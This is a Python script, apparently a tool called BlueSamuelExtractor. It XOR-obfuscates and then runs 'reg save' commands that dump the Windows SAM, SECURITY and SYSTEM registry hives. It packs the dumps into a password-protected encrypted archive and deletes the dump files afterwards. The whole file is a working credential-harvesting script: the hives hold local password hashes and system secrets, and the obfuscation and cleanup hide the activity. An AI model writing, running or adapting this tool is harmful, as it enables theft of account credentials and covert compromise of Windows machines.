import subprocess
import sys
from enum import Enum
from pathlib import Path

class ArchiveTypes(Enum):
    pyzipper = "0"
    szip = "1"
    pyminizip = "2"

class SAMuel:
    def set_password(self,password):
        self.password = password
    def set_archive_type(self,archive_type):
        self.archive_type = archive_type
    def set_archive_name(self,archive_name):
        self.archive_name = archive_name
    def get_password(self):
        return self.password
    def get_archive_type(self):
        return self.archive_type
    def get_archive_name(self):
        return self.archive_name

def extract():
    # The obfuscation is basic bitwise operation with the actual index+2
    command_array_creation=["pge\"qctg\"JINO^Q[QVGO\"Q[QVGO,jkt", "qfd#pbuf#KHON_PF@VQJWZ#PF@VQJWZ-kju", "vac$wera$LOHIXWEI$WEI*lmr"]

    for index in range (0,len(command_array_creation),1):
        
        # Deobfuscate the command
        command = ''.join(chr(ord(c) ^ index+2) for c in command_array_creation[index])
        # Execute the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

def archive_pyminizip(samuel_instane, files):
    import pyminizip

    pyminizip.compress_multiple(files, [], samuel_instane.get_archive_name(), samuel_instane.get_password().encode("utf-8"), 9)


def archive_szip(samuel_instane, files):
    szip_path = Path(r"C:\Program Files\7-Zip\7z.exe")

    cmd = [
        szip_path, # Path of the 7z.exe
        "a", # indicate the create an archive
        samuel_instane.get_archive_name(), # name of the archive file
        *files, # path of the archivated file
        "-p"+samuel_instane.get_password(), # password
        "-mem=AES256" # used encryption
        ]

    subprocess.run(cmd, check=True)


def archive_pyzipper(samuel_instane, files):
    import pyzipper

    # Create a password protected archive file
    with pyzipper.AESZipFile(samuel_instane.get_archive_name(),'w',compression=pyzipper.ZIP_DEFLATED,encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(samuel_instane.get_password().encode("utf-8"))
        for index in range (0,len(files),1):
            zf.write(files[index])

def archive(samuel_instane):
    files=["SYSTEM.HIV","SECURITY.HIV","SAM.HIV"]

    error_occured = False
    for index in range (0,len(files)-1,1):
        file_path = Path(files[index])
        if not file_path.exists():
            error_occured = True

    if(not error_occured):
        match samuel_instane.get_archive_type():
            case ArchiveTypes.pyzipper.value:

                archive_pyzipper(samuel_instane, files)

            case ArchiveTypes.szip.value:

                archive_szip(samuel_instane, files)
                

            case ArchiveTypes.pyminizip.value:
                
                archive_pyminizip(samuel_instane, files)

            case _:
                print("ERROR")
    else:
        sys.exit("Some of the registry wasn't dumped!")

def removal():
    # The obfuscated commands
    command_array_removal=["del SYSTEM.HIV", "del SECURITY.HIV", "del SAM.HIV"]

    # Remove the registry imports
    for index in range (0,len(command_array_removal),1):
        
        # Execute the command
        result = subprocess.run(command_array_removal[index], shell=True, capture_output=True, text=True)

def help():
    print("Usage of the BlueSamuelExtractor.py")
    print("-----------------------------------")
    print("BlueSamuelExtractor.py [ARCHIVE TYPE] [ARCHIVE NAME]")
    print("Supported archivating methods: pyzipper: 0, 7ip: 1, pyminizip: 2 | default: 0")
    print("--random_tmp_file_naming [0/1] | default:0")
    print("--password_archive_enable [0/1] [PASSWORD] | default:0")
    print("-----------------------------------")

def main():
    args = sys.argv[1:]
    if(0 == len(args) or 3 < len(args)):
        help()
        sys.exit("Missing input parameters!")

    samuel_instane = SAMuel()

    samuel_instane.set_archive_type(args[0])
    samuel_instane.set_archive_name(args[1])
    samuel_instane.set_password(args[2])

    extract()
    archive(samuel_instane)
    removal()

if __name__ == "__main__":
    main()
